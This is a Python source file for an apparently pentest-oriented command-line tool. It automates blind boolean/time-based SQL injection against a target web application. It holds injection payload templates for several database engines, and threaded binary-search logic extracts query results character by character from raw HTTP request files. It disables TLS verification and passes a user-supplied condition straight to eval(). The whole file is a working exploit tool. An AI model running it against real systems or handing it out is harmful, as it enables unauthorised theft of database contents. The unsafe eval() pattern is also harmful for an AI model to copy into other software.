from requests import Request, Session, PreparedRequest
from typing import Callable, Literal
from concurrent.futures import Future, ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler
from io import BytesIO
from dataclasses import dataclass
import time
from queue import Queue
from datetime import datetime
import math
import urllib.parse
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HTTPRequest(BaseHTTPRequestHandler):
    ''' Used for parsing raw HTTP requests '''

    def __init__(self, request_text):
        self.rfile = BytesIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message = message

CHAR_MIN = 0x20
CHAR_MAX = 0x7E
SAFE_CHARS = '/'
INITIAL_LENGTH = 16
INITIAL_CHAR = ord('Z')
ERR_SANITY_CHECK = '[!] The result was invalid, either due to a syntax error, too many threads, or because no result exists. Send the requests to Repeater and sanity check them.'
ERR_UPPER_BOUND = '[!] An upper bound on the output length could not be found. Maybe a syntax error?'

POSTGRESQL_PAYLOADS = { # avoids <, > and quotes
    'length': {
        '>': 'SIGN(LENGTH(({row_query}))-{guess})=1',
        '=': 'LENGTH(({row_query}))={guess}'
    },
    'character': {
        '>': 'SIGN(ASCII(SUBSTRING(({row_query}),{index},1))-{guess})=1',
        '=': 'SUBSTRING(({row_query}),{index},1)=CHR({guess})'
    },
    'count': {
        '>': 'SIGN((SELECT COUNT(*) FROM ({query}) AS foo)-{guess})=1',
        '=': '(SELECT COUNT(*) FROM ({query}) AS foo)={guess}'
    },
    'row': '{query} LIMIT 1 OFFSET {row}',
    'compare': '({row_query})=$${guess}$$'
}

MYSQL_PAYLOADS = POSTGRESQL_PAYLOADS # works for both, lol

MSSQL_PAYLOADS = { # untested, sorry
    'length': {
        '>': 'LEN(({row_query}))>{guess}',
        '=': 'LEN(({row_query}))={guess}'
    },
    'character': {
        '>': 'SUBSTRING(({row_query}),{index},1)>CHR({guess})',
        '=': 'SUBSTRING(({row_query}),{index},1)=CHR({guess})'
    },
    'count': {
        '>': '(SELECT COUNT(*) FROM ({query}) AS foo)>{guess}',
        '=': '(SELECT COUNT(*) FROM ({query}) AS foo)={guess}'
    },
    'row': '{query} OFFSET {row} ROWS FETCH NEXT 1 ROWS ONLY',
    'compare': '({row_query})=\'{guess}\''
}

ORACLE_PAYLOADS = { # untested, sorry
    'length': {
        '>': 'LENGTH(({row_query}))>{guess}',
        '=': 'LENGTH(({row_query}))={guess}'
    },
    'character': {
        '>': 'SUBSTR(({row_query}),{index},1)>CHR({guess})',
        '=': 'SUBSTR(({row_query}),{index},1)=CHR({guess})'
    },
    'count': {
        '>': '(SELECT COUNT(*) FROM ({query}) AS foo)>{guess}',
        '=': '(SELECT COUNT(*) FROM ({query}) AS foo)={guess}'
    },
    'row': '{query} OFFSET {row} ROWS FETCH NEXT 1 ROWS ONLY',
    'compare': '({row_query})=\'{guess}\''
}

DATABRICKS_PAYLOADS = { # untested, sorry
    'length': {
        '>': 'length(({row_query}))>{guess}',
        '=': 'length(({row_query}))={guess}'
    },
    'character': {
        '>': 'substr(({row_query}),{index},1)>CHR({guess})',
        '=': 'substr(({row_query}),{index},1)=CHR({guess})'
    },
    'count': {
        '>': '(select count(*) from ({query}) as foo)>{guess}',
        '=': '(select count(*) from ({query}) as foo)={guess}'
    },
    'row': '{query} limit 1 offset {row}',
    'compare': '({row_query})=\'{guess}\''
}

PROFILES = {
    'mysql': MYSQL_PAYLOADS,
    'mssql': MSSQL_PAYLOADS,
    'oracle': ORACLE_PAYLOADS,
    'postgresql': POSTGRESQL_PAYLOADS,
    'databricks': DATABRICKS_PAYLOADS
}

class SafeDict(dict):
    def __missing__(self, key):
        return '{' + key + '}'
    
def p(payload: str, **kwargs) -> str:
    return payload.format_map(SafeDict(**kwargs))

def _make_payloads(payloads: dict, **kwargs) -> dict[str|dict]:
    ''' Replaces {row_query} in all payloads '''
    new = {}
    for k, v in payloads.items():
        if type(v) is dict:
            new[k] = _make_payloads(v, **kwargs)
        elif type(v) is str:
            new[k] = p(v, **kwargs)
    return new

@dataclass
class Context:
    task_id: int
    min: int
    max: int
    guess: int
    errored: bool = False
    done: bool = False

@dataclass
class RowGrabber:
    parent: 'SqlGrab'

    def grab(self, row) -> str:
        self.row = row
        self.payloads = _make_payloads(self.parent.payloads, row=row)
        length = self._get_length()
        return self._get_string(length=length)

    def _length_update(self, context: Context, _):
            print(f'[{self.row + 1}/{self.parent.num_rows}] \x1B[90mDetermining length (between {context.min} and {context.max})\x1B[0m', end='\033[K\r')

    def _get_length(self) -> int:
        payloads = self.payloads['length']
        results = self.parent._run_grabbers(
            workers=[
                ValueGrabber(
                    bigger=payloads['>'],
                    equals=payloads['='],
                    eval_cb=self.parent.evaluate,
                    progress=self.parent.progress_queue
                ).grab
            ],
            guess=INITIAL_LENGTH,
            update=self._length_update
        )
        return results[0]
    
    def _string_update(self, context: Context, results: list[Context]):
        results[context.task_id] = context
        done = [r for r in results if r is not None and r.done]
        output = f'[{self.row + 1}/{self.parent.num_rows}] \x1B[90m[{str(len(done))}/{str(len(results))}]\x1B[0m '
        for r in results:
            output += (
                f'\x1B[90m-\x1B[0m' if r == None else
                f'\x1B[31m{chr(r.guess)}\x1B[0m' if r.errored else
                f'\x1B[32m{chr(r.guess)}\x1B[0m' if r.done else
                f'\x1b[90m{chr(r.guess)}\x1B[0m'
            )
        print(output, end='\033[K\r')

    def _get_string(self, length: int):
        payloads: dict[str, str] = self.payloads['character']
        results = self.parent._run_grabbers([
                ValueGrabber(
                    bigger=p(payloads['>'], index=i + 1),
                    equals=p(payloads['='], index=i + 1),
                    eval_cb=self.parent.evaluate,
                    task_id=i,
                    progress=self.parent.progress_queue,
                    range=(CHAR_MIN, CHAR_MAX)
                ).grab
                for i in range(length)
            ],
            guess=INITIAL_CHAR,
            update=self._string_update
        )
        result = ''.join([chr(r) for r in results])
        
        if not self.parent.evaluate(p(self.payloads['compare'], guess=result)):
            raise RuntimeError(ERR_SANITY_CHECK)

        return result

@dataclass
class ValueGrabber:
    bigger: str
    equals: str
    eval_cb: Callable 
    progress: Queue
    task_id: int | None = None
    range: tuple[int,int] = (0,math.inf)

    def grab(self, guess: int) -> int:
        ''' Determines the value of a variable based on iterative halving/doubling of the search space '''
        min, max = self.range       

        while min != max:
            is_bigger = self.eval_cb(
                self.bigger.format(guess=guess)
            )
            if is_bigger:
                min = guess + 1
            else:
                max = guess

            if max == math.inf: # double value to find upper bound if not already found
                guess *= 2
            else: # narrow down between that range
                guess = min + int((max - min) / 2)
            
            progress = Context(self.task_id, min, max, guess)
            self.progress.put(progress)

            if guess > 2**32:
                raise RuntimeError(ERR_UPPER_BOUND)

        if self.eval_cb(self.equals.format(guess=guess)):
            progress.done = True
        else:
            progress.errored = True
        self.progress.put(progress)
        return guess

@dataclass
class SqlGrab:
    request: Request
    dbms: Literal['mysql', 'mssql', 'oracle', 'postgresql', 'databricks']
    condition: str
    threads: int=1
    delay: float=0
    urlencode: bool=False
    proxy: str | None = None
    output: bool=False
    requests: int = 0
    progress_queue: Queue = Queue()

    def __post_init__(self):
        self.payloads = PROFILES[self.dbms]
        self.proxy = {
            'http': self.proxy,
            'https': self.proxy
        } if self.proxy else {}
        self.executor = ThreadPoolExecutor(max_workers=self.threads)

    @classmethod
    def fromFile(
            cls: 'SqlGrab', host: str, request: str, **kwargs
        ) -> 'SqlGrab':
        return cls(
            request=cls.parseRequest(host, request),
            **kwargs
        )
    
    def _count_update(self, context: Context, _):
            print(f'[+] \x1B[90mDetermining result row count (between {context.min} and {context.max})\x1B[0m\033[K', end='\033[K\r')

    def _get_count(self) -> int:
        payloads = self.payloads['count']
        results = self._run_grabbers(
            workers=[
                ValueGrabber(
                    bigger=payloads['>'],
                    equals=payloads['='],
                    eval_cb=self.evaluate,
                    progress=self.progress_queue
                ).grab
            ],
            guess=INITIAL_LENGTH,
            update=self._count_update
        )
        return results[0]

    def grab(self, query: str) -> list[str]:
        if self.output: print(f'[+] Grabbing: \'{query}\'...')
        self.session = Session()
        self.payloads['row'] = p(self.payloads['row'], query=query)
        self.payloads = _make_payloads(
            payloads=self.payloads,
            row_query=self.payloads['row'],
            query=query
        )
        start = datetime.now()
        self.num_rows = self._get_count()
        if self.output: print(f'[+] Found: {self.num_rows} rows', end='\033[K\n')
        results = []
        row_grabber = RowGrabber(parent=self)
        has_error = False
        for row in range(self.num_rows):
            try:
                results.append(row_grabber.grab(row))
                if self.output: print()
            except RuntimeError as e:
                has_error = True
        elapsed = datetime.now() - start
        if self.output:
            print(f'[+] Sent {self.requests} requests in {elapsed.total_seconds()} seconds')
            print('\n'.join(results))
            if has_error: print(ERR_SANITY_CHECK)
        return results
        
    def _run_grabbers(self, workers: list[Callable], guess: int, update: Callable) -> list:
        results: list[Context] = [
            None for _ in range(len(workers))
        ]
        
        futures: list[Future] = [
            self.executor.submit(
                worker,
                guess=guess
            ) for worker in workers
        ]
        
        if self.output:
            while not all(f.done() for f in futures) or not self.progress_queue.empty():
                context: dict = self.progress_queue.get(block=True)
                update(context, results)

        return [f.result() for f in futures]

    @staticmethod
    def urlEncode(text: str) -> str:
        return urllib.parse.quote_plus(text, safe=SAFE_CHARS)

    def isMatch(self, response):
        ''' Takes a conditional statement from command line arguments and determines the truth value of the query based on it. '''
        return eval(self.condition, locals())
    
    def evaluate(self, payload) -> bool:
        ''' Issues a request and determines truth value of the query based on the response '''
        prepared: PreparedRequest = self.request.prepare()

        # Default to keepalive for speed increase
        prepared.headers['Connection'] = 'keep-alive'

        # perform URL {payload} tag subsitution
        prepared.url = prepared.url.replace(
            '%7Bpayload%7D',
            self.urlEncode(payload)  # URL payload will always be urlencoded
        )

        # perform body {payload} tag subsitution
        if prepared.body:
            if self.urlencode:
                payload = self.urlEncode(payload)
            body = prepared.body.decode('utf-8')
            body = body.replace("{payload}", payload)
            prepared.body = body.encode('utf-8')
            prepared.headers['Content-Length'] = str(len(prepared.body))

        prepared.headers = dict([
            (k, v.format(payload=payload))
            for k, v in prepared.headers.items()
        ])

        response = self.session.send(
            prepared,
            proxies =self.proxy,
            verify=False
        )
        self.requests += 1
        time.sleep(self.delay)
    
        return self.isMatch(response)

    @staticmethod
    def parseRequest(hostname: str, filename: str) -> Request:
        ''' Parses a raw HTTP request from file and verifies it contains at least one {payload} tag. Creates a HTTPRequest from the parsed content. '''
        with open(filename, 'rb') as fp:
            parser = HTTPRequest(fp.read())
            locations = []
            if parser.error_code:
                raise RuntimeError(
                    f'Error parsing request file: {parser.error_message}')

            target = '{uri.scheme}://{uri.netloc}'.format(uri=urllib.parse.urlparse(hostname))
            url = f'{target}{parser.path}'

            request = Request(
                method=parser.command,
                url=url,
                headers=parser.headers,
                data=parser.rfile.read(),
            )

            # scan the parsed request for payload tags before preparing it
            tag = '{payload}'
            if tag in request.url:
                locations.append('url')
            if request.data and tag in str(request.data):
                locations.append('body')
            for key, value in request.headers._headers:
                if tag in key:
                    locations.append(f'{key} header key')
                if tag in value:
                    locations.append(f'{key} header value')

            if not locations:
                raise Exception('[!] The parsed request file does not contain a \'{payload}\' tag. Add the string \'{payload}\' within the request file at the injection point.')

            print(f'[+] Target: {target}, Payload location(s): {", ".join(locations)}')
            return request

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Extracts string data from a conditional SQLi vulnerability using a binary search tree approach.',
        epilog='Note: the program will assume something is broken if responses indicate the output is larger than 2^32 bytes (~4GB)'
    )
    parser.add_argument('-u', '--host', required=True, help='Host URL, including protocol scheme and optionally port. E.g. https://target.com:80')
    parser.add_argument('-r', '--request', required=True, help='Request file containing one or more \'{payload}\' tags')
    parser.add_argument('-q', '--query', required=True, help='SQL query to extract the response of. Must return a single string, e.g. @@version, SELECT user FROM dual')
    parser.add_argument('-d', '--dbms', required=True, choices=PROFILES.keys())
    parser.add_argument('-t', '--threads', required=False, default=1, type=int, help='Number of threads, default: 1. Messes with time-based injections.')
    parser.add_argument('-c', '--condition', required=True, help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.status_code == 401\', \'len(response.content) > 1433\', \'response.elapsed.total_seconds() > 2\'')
    parser.add_argument('--delay', required=False, default=0, type=float, help='Delay in seconds to add between requests. Optional. E.g. 1, 0.2')
    parser.add_argument('--urlencode', required=False, action='store_true', help='Perform URL-encoding on the payloads (payloads in the request\'s path will always be urlencoded).')
    parser.add_argument('--proxy', required=False, help='Proxy to use, e.g. http://127.0.0.1:8080')

    args = vars(parser.parse_args())
    q = args.pop('query')
    grabber: SqlGrab = SqlGrab.fromFile(
        **args,
        output=True
    )
    try:
        grabber.grab(q)
    except RuntimeError as e:
        print('\n'+str(e))
        exit()
    except KeyboardInterrupt:
        print('\n[!] Interrupted')
